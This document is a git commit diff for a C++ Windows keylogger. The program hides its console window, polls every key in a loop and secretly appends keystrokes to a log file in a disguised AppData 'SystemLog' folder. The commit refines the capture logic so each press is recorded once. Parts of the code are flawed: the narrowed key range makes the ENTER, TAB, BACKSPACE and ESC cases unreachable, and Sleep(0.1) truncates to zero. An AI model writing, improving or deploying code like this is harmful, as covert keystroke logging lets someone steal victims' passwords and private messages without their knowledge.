697f675376e49587eb75a75cedc7125131fc98fd
Khalil Hedhili <hadilikhalil@gmail.com>
2025-06-02 14:42:35 +0100

    Update Main_Code.cpp

--- Main_Code.cpp
+++ Main_Code.cpp
@@ -2,6 +2,7 @@
 #include <windows.h>
 #include <fstream>
 #include <string>
+bool keyWasDown[256]={false};
 using namespace std;
 void logKey(string key) {
     std::ofstream logFile("C:\\Users\\Hadil\\AppData\\Roaming\\SystemLog\\log.txt", std::ios::app);
@@ -9,30 +10,38 @@ void logKey(string key) {
     logFile.close();
 }
 int main(){
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    ShowWindow(GetConsoleWindow(),SW_HIDE);
     while(true){
-        for (int i = 0; i < 255; i++){
-            if(GetAsyncKeyState(i) & 0x8000){
-                string wip ="user pressed :";
+        
+        for (int i = 32; i <= 126; i++) {
+            SHORT keyState=GetAsyncKeyState(i);
+            bool isCurrentlyDown=(keyState & 0x8000)!=0;
+            if (isCurrentlyDown && !keyWasDown[i]){
+
                 string key;
-                switch (i){
-                    case 13:
-                        key="ENTER";
-                        break;
-                    case 32:
-                        key="SPACE";
-                        break;
-                    case 9:
-                        key="TAB";
-                        break;
+
+                switch (i) {
+                    case 13: key="[ENTER]"; break;
+                    case 32: key="[SPACE]"; break;
+                    case 9: key="[TAB]"; break;
+                    case 8: key="[BACKSPACE]"; break;
+                    case 27: key="[ESC]"; break;
                     default:
-                        key =char(i);
+                        if (i>=32 && i<=126)
+                            key=static_cast<char>(i);
+                        else
+                            key="[UNKNOWN:"+to_string(i)+"]";
                         break;
                 }
-                wip=wip+key;
-                logKey(wip);
-            }  
+
+                logKey("User pressed: "+key);
+                keyWasDown[i]=true;
+            }
+            else if (!isCurrentlyDown){
+                keyWasDown[i]=false;
+            }
+            Sleep(0.1);
         }
     }
-    return 0; 
+    return 0;
 }
